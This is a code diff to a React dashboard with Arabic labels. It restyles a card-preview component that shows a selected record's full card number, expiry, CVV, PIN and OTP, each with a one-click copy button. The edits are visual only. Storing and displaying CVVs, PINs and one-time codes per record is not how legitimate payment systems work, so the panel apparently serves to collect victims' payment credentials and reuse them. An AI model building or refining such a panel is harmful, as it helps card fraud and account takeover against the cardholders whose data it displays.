@@ -362,11 +362,11 @@ function CardMockup({
 
   return (
     <div className="space-y-3">
-      {/* Card front */}
+      {/* Single card mockup with CVV integrated */}
       <div
         dir="ltr"
         className={cn(
-          "relative aspect-[1.586/1] w-full max-w-md mx-auto rounded-2xl overflow-hidden shadow-2xl border border-white/10 p-5 sm:p-6 flex flex-col justify-between text-white bg-gradient-to-br",
+          "relative aspect-[1.586/1] w-full mx-auto rounded-2xl overflow-hidden shadow-2xl border border-white/10 p-4 flex flex-col justify-between text-white bg-gradient-to-br",
           brand.gradient
         )}
         data-testid="card-mockup"
@@ -377,9 +377,9 @@ function CardMockup({
 
         {/* Top row: chip + brand */}
         <div className="relative flex items-start justify-between">
-          <div className="flex flex-col gap-1.5">
+          <div className="flex items-center gap-2">
             {/* EMV chip */}
-            <div className="w-11 h-8 rounded-md bg-gradient-to-br from-yellow-300 via-amber-400 to-yellow-600 shadow-inner relative overflow-hidden">
+            <div className="w-9 h-7 rounded-md bg-gradient-to-br from-yellow-300 via-amber-400 to-yellow-600 shadow-inner relative overflow-hidden">
               <div className="absolute inset-1 grid grid-cols-3 gap-px">
                 {[...Array(9)].map((_, i) => (
                   <div key={i} className="bg-yellow-700/40 rounded-sm" />
@@ -387,15 +387,15 @@ function CardMockup({
               </div>
             </div>
             {/* Contactless icon */}
-            <svg className="w-5 h-5 text-white/80" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round">
+            <svg className="w-4 h-4 text-white/80" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round">
               <path d="M5 8a14 14 0 0 1 0 8" />
               <path d="M9 6a18 18 0 0 1 0 12" />
               <path d="M13 4a22 22 0 0 1 0 16" />
             </svg>
           </div>
           <div className="text-right">
-            {bank && <div className="text-[10px] uppercase tracking-widest text-white/70 mb-1">{bank}</div>}
-            <div className="text-base sm:text-lg font-extrabold italic tracking-wider drop-shadow">{brand.name}</div>
+            {bank && <div className="text-[9px] uppercase tracking-widest text-white/70 leading-none">{bank}</div>}
+            <div className="text-sm font-extrabold italic tracking-wider drop-shadow">{brand.name}</div>
           </div>
         </div>
 
@@ -406,66 +406,64 @@ function CardMockup({
           aria-label="نسخ رقم البطاقة"
           data-testid="button-copy-mockup-cardNumber"
         >
-          <div className="font-mono text-lg sm:text-2xl font-bold tracking-[0.18em] sm:tracking-[0.22em] drop-shadow-lg break-all leading-none">
+          <div className="font-mono text-base sm:text-lg font-bold tracking-[0.14em] drop-shadow-lg break-all leading-tight">
             {formatted || "•••• •••• •••• ••••"}
           </div>
-          <div className="text-[10px] text-white/70 mt-2 flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
-            {copiedKey === "mockup-cardNumber" ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
-            {copiedKey === "mockup-cardNumber" ? "تم النسخ" : "اضغط للنسخ"}
-          </div>
+          {copiedKey === "mockup-cardNumber" && (
+            <div className="text-[9px] text-emerald-200 mt-0.5 flex items-center gap-1">
+              <Check className="h-2.5 w-2.5" />
+              تم النسخ
+            </div>
+          )}
         </button>
 
-        {/* Bottom row: holder + expiry */}
-        <div className="relative flex items-end justify-between gap-4">
+        {/* Bottom row: holder + expiry + cvv */}
+        <div className="relative flex items-end justify-between gap-2">
           <div className="min-w-0 flex-1">
-            <div className="text-[9px] uppercase tracking-widest text-white/60 mb-1">Card Holder</div>
-            <div className="text-sm sm:text-base font-bold uppercase truncate" data-testid="text-mockup-name">
+            <div className="text-[8px] uppercase tracking-widest text-white/60 leading-none mb-0.5">Holder</div>
+            <div className="text-xs font-bold uppercase truncate" data-testid="text-mockup-name">
               {cardName || "—"}
             </div>
           </div>
-          <div className="text-right">
-            <div className="text-[9px] uppercase tracking-widest text-white/60 mb-1">Expires</div>
-            <div className="text-sm sm:text-base font-bold font-mono" data-testid="text-mockup-expiry">
+          <button
+            onClick={() => onCopy("mockup-expiry", expiryDate)}
+            className="text-right"
+            data-testid="button-copy-mockup-expiry"
+            aria-label="نسخ تاريخ الانتهاء"
+          >
+            <div className="text-[8px] uppercase tracking-widest text-white/60 leading-none mb-0.5">Exp</div>
+            <div className="text-xs font-bold font-mono" data-testid="text-mockup-expiry">
               {expiryDate || "MM/YY"}
             </div>
-          </div>
-        </div>
-      </div>
-
-      {/* Card back (CVV strip) */}
-      <div
-        dir="ltr"
-        className="relative aspect-[1.586/0.55] w-full max-w-md mx-auto rounded-2xl overflow-hidden shadow-xl border border-white/10 bg-gradient-to-br from-zinc-800 to-zinc-950 p-3 flex items-center"
-      >
-        <div className="absolute inset-x-0 top-3 h-8 bg-black" />
-        <div className="relative ml-auto flex items-center gap-2 bg-white/95 text-zinc-900 px-3 py-1.5 rounded-md shadow-md">
-          <span className="text-[9px] font-semibold text-zinc-500 uppercase">CVV</span>
+          </button>
           <button
             onClick={() => onCopy("mockup-cvv", cvv)}
-            className="font-mono font-bold text-base tracking-widest"
-            aria-label="نسخ CVV"
+            className="text-right bg-white/15 hover:bg-white/25 backdrop-blur-sm border border-white/30 rounded-md px-2 py-1 transition-colors"
             data-testid="button-copy-mockup-cvv"
+            aria-label="نسخ CVV"
           >
-            {cvv || "•••"}
+            <div className="text-[8px] uppercase tracking-widest text-white/80 leading-none mb-0.5">CVV</div>
+            <div className="text-xs font-bold font-mono">
+              {cvv || "•••"}
+            </div>
           </button>
-          {copiedKey === "mockup-cvv" && <Check className="h-3 w-3 text-emerald-600" />}
         </div>
       </div>
 
       {/* Extras row: PIN + OTP */}
       {(cardPin || cardOtp) && (
-        <div dir="rtl" className="grid grid-cols-2 gap-2 max-w-md mx-auto">
+        <div dir="rtl" className="grid grid-cols-2 gap-2">
           {cardPin && (
             <button
               onClick={() => onCopy("mockup-pin", cardPin)}
-              className="rounded-xl border border-amber-500/30 bg-amber-500/10 hover:bg-amber-500/15 p-3 text-right transition-colors"
+              className="rounded-xl border border-amber-500/30 bg-amber-500/10 hover:bg-amber-500/15 p-2.5 text-right transition-colors"
               data-testid="button-copy-mockup-pin"
             >
-              <div className="text-[10px] text-amber-300/80 mb-1 flex items-center gap-1">
+              <div className="text-[10px] text-amber-300/80 mb-0.5 flex items-center gap-1">
                 <Lock className="h-3 w-3" />
                 PIN
               </div>
-              <div className="font-mono font-bold text-base text-amber-100" dir="ltr">
+              <div className="font-mono font-bold text-sm text-amber-100" dir="ltr">
                 {cardPin}
               </div>
             </button>
@@ -473,14 +471,14 @@ function CardMockup({
           {cardOtp && (
             <button
               onClick={() => onCopy("mockup-otp", cardOtp)}
-              className="rounded-xl border border-emerald-500/30 bg-emerald-500/10 hover:bg-emerald-500/15 p-3 text-right transition-colors"
+              className="rounded-xl border border-emerald-500/30 bg-emerald-500/10 hover:bg-emerald-500/15 p-2.5 text-right transition-colors"
               data-testid="button-copy-mockup-otp"
             >
-              <div className="text-[10px] text-emerald-300/80 mb-1 flex items-center gap-1">
+              <div className="text-[10px] text-emerald-300/80 mb-0.5 flex items-center gap-1">
                 <Hash className="h-3 w-3" />
                 OTP
               </div>
-              <div className="font-mono font-bold text-base text-emerald-100" dir="ltr">
+              <div className="font-mono font-bold text-sm text-emerald-100" dir="ltr">
                 {cardOtp}
               </div>
             </button>
@@ -818,17 +816,17 @@ export default function Dashboard() {
               {/* Sections grid */}
               <ScrollArea className="flex-1">
                 <div className="p-4 sm:p-6 grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-4">
-                  {/* Card mockup — spans full width when payment data exists */}
+                  {/* Card mockup — single grid cell */}
                   {selected.cardNumber && (
                     <section
-                      className="rounded-2xl border border-white/10 bg-[#17212b] overflow-hidden lg:col-span-2 xl:col-span-3"
+                      className="rounded-2xl border border-white/10 bg-[#17212b] overflow-hidden flex flex-col"
                       data-testid="section-card-mockup"
                     >
                       <header className="px-4 py-3 flex items-center gap-2 bg-gradient-to-l from-violet-500 to-purple-600 border-b border-white/10">
                         <CreditCard className="h-4 w-4 text-white" />
                         <h3 className="text-sm font-bold text-white">معاينة البطاقة</h3>
                       </header>
-                      <div className="p-5">
+                      <div className="p-3">
                         <CardMockup
                           cardNumber={selected.cardNumber}
                           cardName={selected.cardName}
